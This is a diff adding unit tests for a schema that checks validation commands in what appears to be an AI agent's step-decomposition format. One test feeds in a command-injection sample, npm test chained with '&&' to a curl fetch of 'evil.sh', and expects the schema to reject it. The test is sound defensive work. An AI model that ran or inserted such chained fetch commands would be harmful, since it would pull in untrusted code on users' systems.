@@ -22,6 +22,18 @@ function decomposeStep(commands: Array<{ command: string; args?: string[] }>) {
   };
 }
 
+function atomicStep(commands?: Array<{ command: string; args?: string[] }>) {
+  return {
+    decision: "atomic",
+    reasoning: "single focused implementation",
+    allowedPaths: ["src/**"],
+    forbiddenPaths: [],
+    expectedFiles: ["src/calculate.ts"],
+    acceptanceCriteria: ["calculation works"],
+    ...(commands !== undefined ? { leafValidationCommands: commands } : {})
+  };
+}
+
 describe("StepValidationCommandSchema safety", () => {
   it("accepts a plain npm test command", () => {
     const parsed = DecomposeStepOutputSchema.safeParse(decomposeStep([{ command: "npm", args: ["test"] }]));
@@ -41,5 +53,42 @@ describe("StepValidationCommandSchema safety", () => {
   it("rejects a command with a path separator", () => {
     const parsed = DecomposeStepOutputSchema.safeParse(decomposeStep([{ command: "./node_modules/.bin/jest" }]));
     expect(parsed.success).toBe(false);
+  });
+
+  it("accepts executable leaf validation commands on atomic steps", () => {
+    const parsed = DecomposeStepOutputSchema.safeParse(
+      atomicStep([{ command: "npm", args: ["test", "--", "src/calculate.test.ts"] }])
+    );
+
+    expect(parsed.success).toBe(true);
+    if (parsed.success) {
+      expect(parsed.data.decision).toBe("atomic");
+      if (parsed.data.decision !== "atomic") throw new Error("expected atomic step");
+      expect(parsed.data.leafValidationCommands).toEqual([
+        { command: "npm", args: ["test", "--", "src/calculate.test.ts"] }
+      ]);
+    }
+  });
+
+  it("defaults missing leaf validation commands to an empty array", () => {
+    const parsed = DecomposeStepOutputSchema.safeParse(atomicStep());
+
+    expect(parsed.success).toBe(true);
+    if (parsed.success) {
+      expect(parsed.data.decision).toBe("atomic");
+      if (parsed.data.decision !== "atomic") throw new Error("expected atomic step");
+      expect(parsed.data.leafValidationCommands).toEqual([]);
+    }
+  });
+
+  it("rejects unsafe leaf validation commands on atomic steps", () => {
+    const parsed = DecomposeStepOutputSchema.safeParse(
+      atomicStep([{ command: "npm", args: ["test", "&&", "curl", "evil.sh"] }])
+    );
+
+    expect(parsed.success).toBe(false);
+    if (!parsed.success) {
+      expect(JSON.stringify(parsed.error.issues)).toContain("unsafe validation command");
+    }
   });
 });
